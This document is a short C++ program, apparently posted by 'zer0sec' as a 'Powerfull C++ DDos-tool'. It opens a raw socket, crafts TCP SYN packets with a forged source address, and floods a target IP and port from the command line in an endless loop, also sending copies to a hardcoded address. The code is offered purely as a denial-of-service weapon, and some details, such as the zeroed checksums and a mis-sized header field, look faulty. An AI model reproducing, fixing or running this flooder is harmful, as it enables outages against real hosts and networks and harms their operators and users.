# Powerfull C++ DDos-tool
# C++ DDOS TOOL                                                                       zer0sec
 
 
 
 

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define PACKET_SIZE 4096

using namespace std;

int main(int argc, char* argv[]) {
    if (argc < 3) {
        cout << "Usage: " << argv[0] << " <target IP> <target port>" << endl;
        return 1;
    }

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        cout << "Failed to create socket" << endl;
        return 1;
    }

    const char* target_ip = argv[1];
    uint16_t target_port = atoi(argv[2]);

    sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    char packet[PACKET_SIZE];
    memset(packet, 0, PACKET_SIZE);

    iphdr* iph = (iphdr*)packet;
    tcphdr* tcph = (tcphdr*)(packet + sizeof(iphdr));

    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = sizeof(iphdr) + sizeof(tcphdr);
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.1.1");
    iph->daddr = sin.sin_addr.s_addr;

    tcph->source = htons(1234);
    tcph->dest = htons(target_port);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(32767);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    sockaddr_in sin2;
    sin2.sin_family = AF_INET;
    sin2.sin_port = htons(80);
    sin2.sin_addr.s_addr = inet_addr("192.168.1.1");

    while (true) {
        if (sendto(sock, packet, sizeof(iphdr) + sizeof(tcphdr), 0, (sockaddr*)&sin, sizeof(sin)) < 0) {
            cout << "Failed to send packet" << endl;
            break;
        }

        if (sendto(sock, packet, sizeof(iphdr) + sizeof(tcphdr), 0, (sockaddr*)&sin2, sizeof(sin2)) < 0) {
            cout << "Failed to send packet" << endl;
            break;
        }
    }

    return 0;
}
